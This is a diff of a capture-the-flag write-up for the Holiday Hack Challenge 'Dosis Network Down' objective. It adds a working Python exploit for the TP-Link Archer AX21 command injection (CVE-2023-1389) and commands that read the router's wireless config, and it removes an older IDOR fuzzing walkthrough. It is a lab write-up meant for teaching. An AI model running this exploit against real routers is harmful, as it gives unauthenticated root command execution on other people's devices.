@@ -2,12 +2,12 @@
 icon: material/text-box-outline
 ---
 
-# IDORable Bistro
+# Dosis_Network_Down
 
-![IDORable Bistro](../img/objectives/Dosis_Network_Down/Dosis_Network_Down_0.png)
+![Dosis_Network_Down](../img/objectives/Dosis_Network_Down/Dosis_Network_Down_0.png)
 
 **Difficulty**: :fontawesome-solid-star::fontawesome-solid-star::fontawesome-regular-star::fontawesome-regular-star::fontawesome-regular-star:<br/>
-**Direct link**: [IDORable Bistro](https://dosis-network-down.holidayhackchallenge.com/)
+**Direct link**: [Dosis_Network_Down](https://dosis-network-down.holidayhackchallenge.com/)
 
 
 ## Hints
@@ -35,56 +35,68 @@ The challenge website notes the router firmware version and the hardware version
 https://dosis-network-down.holidayhackchallenge.com/ 
 ```
 
-![IDORable Bistro](../img/objectives/Dosis_Network_Down/Dosis_Network_Down_1.png)
+![Dosis_Network_Down](../img/objectives/Dosis_Network_Down/Dosis_Network_Down_1.png)
 
 TP-Link Archer AX21 (AX1800) firmware versions before 1.1.4 Build 20230219 contained a command injection vulnerability in the country form of the /cgi-bin/luci;stok=/locale endpoint on the web management interface. <br/>
 Specifically, the country parameter of the write operation was not sanitized before being used in a call to popen(), allowing an unauthenticated attacker to inject commands, which would be run as root, with a simple POST request.<br/>
 Ref : <br/>
 [nvd.nist.gov](https://nvd.nist.gov/vuln/detail/cve-2023-1389 )<br/>
 
+The [Github /Voyag3r-Security/CVE-2023-1389 repository](https://github.com/Voyag3r-Security/CVE-2023-1389/blob/main/archer-rev-shell.py ) notes they were test teh reverse shell on 2.1.5 Build 20211231 rel.73898(5553); Hardware Version Archer AX21 v2.0<br/>
+The script ```archer-file-transfer.py``` in that repo leverages a reverse shell.<br/>
+We modify that script to just take any arbitrary command to execute.
 
+```bash linenums="1" title="CVE-2023-1389"
+import requests, urllib.parse, argparse
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-https://github.com/Voyag3r-Security/CVE-2023-1389/blob/main/archer-rev-shell.py
+# Suppress warning for connecting to a router with a self-signed certificate
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
+parser = argparse.ArgumentParser()
 
-Browsing the above URL reveals the below API<br/>
+parser.add_argument("-r", "--router", dest = "router", default = "192.168.0.1", help="Router name")
+parser.add_argument("-p", "--payload", dest = "payload", default = "ls", help="attack payload")
+
+args = parser.parse_args()
+
+# Ashish Gupta -  Take an arbitrary command in the -payload switch to execute
+payload = args.payload
+url_command = "https://" + args.router + "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(" + payload + ")"
+
+# Send the URL twice to run the command. Sending twice is necessary for the attack
+r = requests.get(url_command, verify=False)
+r = requests.get(url_command, verify=False)
+print(f'Command to execute :{payload}')
+print("########## ---Output--- ########")
+print(r.text)
+
 ```
-https://its-idorable.holidayhackchallenge.com/api/receipt?id=103
+
+Sending the ```ls``` command to list all files. <br/>
+```
+python archer-rev-shell.py -r dosis-network-down.holidayhackchallenge.com -p 'ls' 
+```
+![Dosis_Network_Down](../img/objectives/Dosis_Network_Down/Dosis_Network_Down_2.png)
+
+
+Sending the ```cat /etc/config/wireless``` to get the wireless config<br/>
+```
+python archer-rev-shell.py -r dosis-network-down.holidayhackchallenge.com -p 'cat /etc/config/wireless' 
 ```
 
-Just going to the API URL shows the API output in JSON format.<br/>
+![Dosis_Network_Down](../img/objectives/Dosis_Network_Down/Dosis_Network_Down_3.png)
 
-![IDORable Bistro](../img/objectives/IDORable_Bistro/IDORable_Bistro_3.png)
+The config shows the WiFi password as SprinklesAndPackets2025!<br/>
 
-Changing to a different receipt ID shows different output which proves the API has IDOR vulnerability. <br/>
-```
-https://its-idorable.holidayhackchallenge.com/api/receipt?id=104
-```
-![IDORable Bistro](../img/objectives/IDORable_Bistro/IDORable_Bistro_4.png)
-
-
-Trying to fuzz the API url with the receipt id from 1 - 200 for “frozen” in the API response and we get a hit.<br/>
-
-Below fuzzes the URL id from 1 to 200 looking for "frozen" in the part of response (because the hint notes that the gnome asked for the "frozen" sushi).<br/>
-```
-seq 1 200 | ffuf -w - -u "https://its-idorable.holidayhackchallenge.com/api/receipt?id=FUZZ" -mr "frozen"
-```
-
-We get a hit for receipt id 139.<br/>
-![IDORable Bistro](../img/objectives/IDORable_Bistro/IDORable_Bistro_5.png)
-
-Manually looking at the API response for receipt id 139.<br/>
-```
-https://its-idorable.holidayhackchallenge.com/api/receipt?id=139
-```
-![IDORable Bistro](../img/objectives/IDORable_Bistro/IDORable_Bistro_6.png)
-
-We have the name : Bartholomew Quibblefrost
+The answer is accepted. <br/>
+![Dosis_Network_Down](../img/objectives/Dosis_Network_Down/Dosis_Network_Down_4.png)
 
 
 !!! success "Answer"
-   Bartholomew Quibblefrost
+   SprinklesAndPackets2025!
 
 ## Response
-!!! quote "Josh Wright"
-    Excellent work! You've demonstrated textbook penetration testing skills across every challenge - your discipline and methodology are impeccable!.<br/>
+!!! quote "Janusz Jasinski"
+    Brilliant work, that. Got me connection back and sent those gnomes packin' from the router.<br/>
+    Now I can finally get back to streamin' some proper metal. BTC tips accepted, by the way.
